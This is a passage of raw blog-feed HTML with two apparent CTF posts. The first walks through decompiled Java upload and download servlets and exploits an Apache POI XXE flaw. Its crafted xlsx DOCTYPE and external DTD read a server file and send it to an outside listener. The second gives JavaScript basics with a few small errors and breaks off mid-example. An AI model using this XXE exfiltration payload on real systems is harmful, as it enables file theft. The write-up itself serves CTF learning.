class="hljs-keyword">import</span> javax.servlet.ServletContext;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DownloadServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span><br>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span><br>    <span class="hljs-keyword">throws</span> ServletException, IOException<br>  &#123;<br>    doPost(request, response); &#125;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;filename&quot;</span>);<br>    fileName = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(fileName.getBytes(<span class="hljs-string">&quot;ISO8859-1&quot;</span>), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;filename=&quot;</span> + fileName);<br>    <span class="hljs-keyword">if</span> ((fileName != <span class="hljs-literal">null</span>) &amp;&amp; (fileName.toLowerCase().contains(<span class="hljs-string">&quot;flag&quot;</span>))) &#123;<br>      request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;禁止读取&quot;</span>);<br>      request.getRequestDispatcher(<span class="hljs-string">&quot;/message.jsp&quot;</span>).forward(request, response);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileSaveRootPath</span> <span class="hljs-operator">=</span> getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/upload&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> findFileSavePathByFileName(fileName, fileSaveRootPath);<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>    <span class="hljs-keyword">if</span> (!(file.exists())) &#123;<br>      request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;您要下载的资源已被删除!&quot;</span>);<br>      request.getRequestDispatcher(<span class="hljs-string">&quot;/message.jsp&quot;</span>).forward(request, response);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">realname</span> <span class="hljs-operator">=</span> fileName.substring(fileName.indexOf(<span class="hljs-string">&quot;_&quot;</span>) + <span class="hljs-number">1</span>);<br>    response.setHeader(<span class="hljs-string">&quot;content-disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(realname, <span class="hljs-string">&quot;UTF-8&quot;</span>));<br>    <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(path + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>    <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>    <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>    <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ((len = in.read(buffer)) &gt; <span class="hljs-number">0</span>)<br>      out.write(buffer, <span class="hljs-number">0</span>, len);<br>    in.close();<br>    out.close();<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">findFileSavePathByFileName</span><span class="hljs-params">(String filename, String saveRootPath)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> filename.hashCode();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">dir1</span> <span class="hljs-operator">=</span> hashCode &amp; <span class="hljs-number">0xF</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">dir2</span> <span class="hljs-operator">=</span> (hashCode &amp; <span class="hljs-number">0xF0</span>) &gt;&gt; <span class="hljs-number">4</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> saveRootPath + <span class="hljs-string">&quot;/&quot;</span> + dir1 + <span class="hljs-string">&quot;/&quot;</span> + dir2;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(dir);<br>    <span class="hljs-keyword">if</span> (!(file.exists()))<br>      file.mkdirs();<br>    <span class="hljs-keyword">return</span> dir;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>UploadServlet.class</code>源码如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.abc.servlet;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.PrintStream;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.UUID;<br><span class="hljs-keyword">import</span> javax.servlet.RequestDispatcher;<br><span class="hljs-keyword">import</span> javax.servlet.ServletContext;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> org.apache.commons.fileupload.FileItem;<br><span class="hljs-keyword">import</span> org.apache.commons.fileupload.FileUploadException;<br><span class="hljs-keyword">import</span> org.apache.commons.fileupload.disk.DiskFileItemFactory;<br><span class="hljs-keyword">import</span> org.apache.commons.fileupload.servlet.ServletFileUpload;<br><span class="hljs-keyword">import</span> org.apache.poi.openxml4j.exceptions.InvalidFormatException;<br><span class="hljs-keyword">import</span> org.apache.poi.ss.usermodel.Sheet;<br><span class="hljs-keyword">import</span> org.apache.poi.ss.usermodel.Workbook;<br><span class="hljs-keyword">import</span> org.apache.poi.ss.usermodel.WorkbookFactory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UploadServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span><br>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span><br>    <span class="hljs-keyword">throws</span> ServletException, IOException<br>  &#123;<br>    doPost(request, response); &#125;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">savePath</span> <span class="hljs-operator">=</span> getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/upload&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">tempPath</span> <span class="hljs-operator">=</span> getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/temp&quot;</span>);<br>    <span class="hljs-type">File</span> <span class="hljs-variable">tempFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(tempPath);<br>    <span class="hljs-keyword">if</span> (!(tempFile.exists()))<br>      tempFile.mkdir();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-type">DiskFileItemFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DiskFileItemFactory</span>();<br>      factory.setSizeThreshold(<span class="hljs-number">102400</span>);<br>      factory.setRepository(tempFile);<br>      <span class="hljs-type">ServletFileUpload</span> <span class="hljs-variable">upload</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletFileUpload</span>(factory);<br><br>      upload.setHeaderEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>      upload.setFileSizeMax(<span class="hljs-number">1048576L</span>);<br>      upload.setSizeMax(<span class="hljs-number">10485760L</span>);<br>      <span class="hljs-keyword">if</span> (!(ServletFileUpload.isMultipartContent(request)))<br>        <span class="hljs-keyword">return</span>;<br>      <span class="hljs-type">List</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> upload.parseRequest(request);<br>      <span class="hljs-type">Iterator</span> <span class="hljs-variable">localIterator</span> <span class="hljs-operator">=</span> list.iterator();<br>      <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123; FileItem fileItem;<br>        String filename;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123; <span class="hljs-keyword">do</span> &#123; String str;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123; <span class="hljs-keyword">if</span> (!(localIterator.hasNext())) <span class="hljs-keyword">break</span> label438; fileItem = (FileItem)localIterator.next();<br>              <span class="hljs-keyword">if</span> (!(fileItem.isFormField())) <span class="hljs-keyword">break</span>;<br>              <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> fileItem.getFieldName();<br>              str = fileItem.getString(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            &#125;<br><br>            filename = fileItem.getName(); &#125;<br>          <span class="hljs-keyword">while</span> (filename == <span class="hljs-literal">null</span>); <span class="hljs-keyword">if</span> (!(filename.trim().equals(<span class="hljs-string">&quot;&quot;</span>))) <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileExtName</span> <span class="hljs-operator">=</span> filename.substring(filename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>);<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> fileItem.getInputStream();<br>        <span class="hljs-keyword">if</span> ((filename.startsWith(<span class="hljs-string">&quot;excel-&quot;</span>)) &amp;&amp; (<span class="hljs-string">&quot;xlsx&quot;</span>.equals(fileExtName)))<br>          <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Workbook</span> <span class="hljs-variable">wb1</span> <span class="hljs-operator">=</span> WorkbookFactory.create(in);<br>            <span class="hljs-type">Sheet</span> <span class="hljs-variable">sheet</span> <span class="hljs-operator">=</span> wb1.getSheetAt(<span class="hljs-number">0</span>);<br>            System.out.println(sheet.getFirstRowNum());<br>          &#125; <span class="hljs-keyword">catch</span> (InvalidFormatException e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);<br>            e.printStackTrace();<br>          &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">saveFilename</span> <span class="hljs-operator">=</span> makeFileName(filename);<br>        request.setAttribute(<span class="hljs-string">&quot;saveFilename&quot;</span>, saveFilename);<br>        request.setAttribute(<span class="hljs-string">&quot;filename&quot;</span>, filename);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">realSavePath</span> <span class="hljs-operator">=</span> makePath(saveFilename, savePath);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(realSavePath + <span class="hljs-string">&quot;/&quot;</span> + saveFilename);<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ((len = in.read(buffer)) &gt; <span class="hljs-number">0</span>)<br>          out.write(buffer, <span class="hljs-number">0</span>, len);<br>        in.close();<br>        out.close();<br>        label438: message = <span class="hljs-string">&quot;文件上传成功!&quot;</span>;<br>      &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (FileUploadException e) &#123;<br>      e.printStackTrace();<br>    &#125;<br>    request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, message);<br>    request.getRequestDispatcher(<span class="hljs-string">&quot;/ListFileServlet&quot;</span>).forward(request, response); &#125;<br><br>  <span class="hljs-keyword">private</span> String <span class="hljs-title function_">makeFileName</span><span class="hljs-params">(String filename)</span> &#123;<br>    <span class="hljs-keyword">return</span> UUID.randomUUID().toString() + <span class="hljs-string">&quot;_&quot;</span> + filename; &#125;<br><br>  <span class="hljs-keyword">private</span> String <span class="hljs-title function_">makePath</span><span class="hljs-params">(String filename, String savePath)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> filename.hashCode();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">dir1</span> <span class="hljs-operator">=</span> hashCode &amp; <span class="hljs-number">0xF</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">dir2</span> <span class="hljs-operator">=</span> (hashCode &amp; <span class="hljs-number">0xF0</span>) &gt;&gt; <span class="hljs-number">4</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> savePath + <span class="hljs-string">&quot;/&quot;</span> + dir1 + <span class="hljs-string">&quot;/&quot;</span> + dir2;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(dir);<br>    <span class="hljs-keyword">if</span> (!(file.exists()))<br>      file.mkdirs();<br>    <span class="hljs-keyword">return</span> dir;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>从<code>UploadServlet.class</code>可以关注到如下关键代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> ((filename.startsWith(<span class="hljs-string">&quot;excel-&quot;</span>)) &amp;&amp; (<span class="hljs-string">&quot;xlsx&quot;</span>.equals(fileExtName)))<br>          <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Workbook</span> <span class="hljs-variable">wb1</span> <span class="hljs-operator">=</span> WorkbookFactory.create(in);<br>            <span class="hljs-type">Sheet</span> <span class="hljs-variable">sheet</span> <span class="hljs-operator">=</span> wb1.getSheetAt(<span class="hljs-number">0</span>);<br>            System.out.println(sheet.getFirstRowNum());<br>          &#125; <span class="hljs-keyword">catch</span> (InvalidFormatException e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);<br>            e.printStackTrace();<br>          &#125;<br></code></pre></td></tr></table></figure><p>其中<code>Apache POI XML外部实体攻击()</code>相关对应漏洞版本为<code>poi-ooxml-3.10-FINAL.jar及以下版本</code>，并且也是针对<code>Office</code>的攻击，于是可以进行尝试。创建名为<code>excel-1.xlsx</code>的文件，修改后缀为<code>zip</code>,使用<code>winrar</code>进行解压，修改<code>[Content-Types].xml</code>文件，在第2行添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://ip:8001/file.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;%int;%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p>然后将文件重新压缩，并改后缀为<code>xlsx</code></p><p>接着使用<code>python3</code>起一个HTTP服务<code>python -m http.server 8001</code>开启HTTP服务，并放置<code>file.dtd</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:8989?p=%file;&#x27;&gt;&quot;&gt;<br>%int;<br>%send;<br></code></pre></td></tr></table></figure><p>开启监听，上传xlsx文件</p><pre><code class="hljs">如果你有任何其他需求或需要进一步的解释，请告诉我。</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>ssrf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>js原型链污染</title>
    <link href="/2024/09/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <url>/2024/09/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    
    <content type="html"><![CDATA[<h3 id="JS基础数据类型："><a href="#JS基础数据类型：" class="headerlink" title="JS基础数据类型："></a>JS基础数据类型：</h3><ol><li><strong>基本数据类型</strong>:<ul><li><code>String</code></li><li><code>Number</code></li><li><code>Boolean</code></li><li><code>Null</code></li><li><code>Undefined</code></li><li><code>Symbol</code></li></ul></li><li><strong>引用类型</strong>:<ul><li><code>Object</code></li><li><code>Array</code></li><li><code>Function</code></li></ul></li></ol><h3 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义:"></a>变量定义:</h3><ul><li><p><strong>变量定义的例子</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> car = <span class="hljs-string">&#x27;A&#x27;</span>; <span class="hljs-comment">// 定义字符串</span><br><span class="hljs-keyword">var</span> car = <span class="hljs-string">&#x27;B&#x27;</span>; <span class="hljs-comment">// 另一个字符串</span><br><span class="hljs-keyword">var</span> x = <span class="hljs-number">3.0</span>;   <span class="hljs-comment">// 定义数字</span><br><span class="hljs-keyword">var</span> is = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 定义布尔值</span><br></code></pre></td></tr></table></figure></li><li><p><strong>数组定义</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> cars = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>();<br>cars[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;A&quot;</span>; <span class="hljs-comment">// 直接赋值</span><br><br><span class="hljs-keyword">var</span> cars = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>); <span class="hljs-comment">// 使用Array构造函数定义</span><br><br><span class="hljs-keyword">var</span> cars = [<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>]; <span class="hljs-comment">// 使用字面量定义数组</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="对象定义："><a href="#对象定义：" class="headerlink" title="对象定义："></a>对象定义：</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> person = &#123;<span class="hljs-attr">first</span>: <span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-attr">last</span>: <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-attr">score</span>: <span class="hljs-string">&quot;C&quot;</span>&#125;; <span class="hljs-comment">// 定义对象</span><br></code></pre></td></tr></table></figure><p>通过对象进行属性访问:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">name = person.<span class="hljs-property">first</span>; <span class="hljs-comment">// 访问对象的属性</span><br>name = person[<span class="hljs-string">&quot;first&quot;</span>]; <span class="hljs-comment">// 另一种方式访问 (类似 Python)</span><br></code></pre></td></tr></table></figure><h3 id="函数定义："><a href="#函数定义：" class="headerlink" title="函数定义："></a>函数定义：</h3><ul><li><p><strong>传统函数定义</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">xx</span>(<span class="hljs-params">a, c</span>) &#123;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>匿名函数赋值</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> xx = <span class="hljs-keyword">function</span>(<span class="hljs-params">a, c</span>) &#123;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p><strong>箭头函数</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> <span class="hljs-title function_">xx</span> = (<span class="hljs-params">a, c</span>) =&gt; &#123;&#125;;<br></code></pre></td></tr></table></figure></li></ul><h3 id="加法操作符的使用："><a href="#加法操作符的使用：" class="headerlink" title="加法操作符的使用："></a>加法操作符的使用：</h3><p>除了number+number和bool和bool其余返回string</p><ul><li><p><strong>数字与字符串的拼接</strong>：</p><ul><li>数字加数字：<code>1 + 1 = 2</code></li><li>字符串加字符串：<code>&quot;abc&quot; + &quot;def&quot; = &quot;abcdef&quot;</code></li><li>字符串加数字：<code>&quot;abc&quot; + 1 = &quot;abc1&quot;</code></li><li>字符串加对象:     “uert”+{person:’abc’}&#x3D;uert{person:’abc’}</li><li>对象加对象：<code>[Object Object]</code> 拼接结果</li><li>字符串加数组: “uert”+[“abc”,”efg”]&#x3D;”uertabc”,”efg”</li><li>字符串加null: “uert”+null&#x3D; “uertnull”  同理true和false</li></ul><p> Python 里面不能像 JS 这样混合不同类型的数据来做拼接，但 JS 是可以的。</p></li><li><p><strong>其他运算符</strong>:</p><ul><li>fuc+fuc&#x3D;”(a,b)&#x3D;&gt;{return(a+b)}(a,b)&#x3D;&gt;{return(a+b)}”</li><li>arr+arr&#x3D;”abc,efgabc,abc”</li><li>arr+true&#x3D; “abc,deftrue”</li></ul></li></ul><h3 id="非字符串与非字符串的操作："><a href="#非字符串与非字符串的操作：" class="headerlink" title="非字符串与非字符串的操作："></a>非字符串与非字符串的操作：</h3><ul><li><code>true + true = 2</code></li><li><code>false + false = 0</code></li></ul><h3 id="函数的简写："><a href="#函数的简写：" class="headerlink" title="函数的简写："></a>函数的简写：</h3><ul><li>使用箭头函数：<code>(a, b) =&gt; &#123;return (a + b)&#125;</code> 和 <code>arr + true = abc.deftrue</code>。</li></ul><h3 id="长度属性："><a href="#长度属性：" class="headerlink" title="长度属性："></a>长度属性：</h3><ul><li><p><strong>String 的长度</strong>:</p><ul><li><code>string.length</code> 返回字符串的字符数。</li></ul></li><li><p><strong>Array 的长度</strong>:</p><ul><li><code>Array.length</code> 返回数组的元素个数。</li></ul></li><li><p>还提到 <code>number 没有 length</code> 属性。</p></li></ul><h3 id="JSON-解析："><a href="#JSON-解析：" class="headerlink" title="JSON 解析："></a>JSON 解析：</h3><ul><li>使用 <code>JSON.parse()</code> 可以将 JSON 字符串转化为对象。</li><li>注意到你提到 <code>JSON.parse(null)</code> 会返回 <code>null</code>。</li></ul><h3 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h3><ul><li>使用 <code>in</code> 可以遍历对象的属性。</li><li>在最右侧提到 <code>这里指的是数字</code>。</li></ul><h1 id="js-trick"><a href="#js-trick" class="headerlink" title="js   trick"></a>js   trick</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">NaN==NaN</span><br>&lt;false<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">NaN==NaN</span><br>&lt;false<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash"><span class="hljs-literal">false</span>==<span class="hljs-string">&#x27;0&#x27;</span></span><br>&lt;ture<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0==<span class="hljs-string">&#x27;0&#x27;</span></span><br>&lt;true<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0==<span class="hljs-literal">false</span></span><br>&lt;true<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">1e-1234 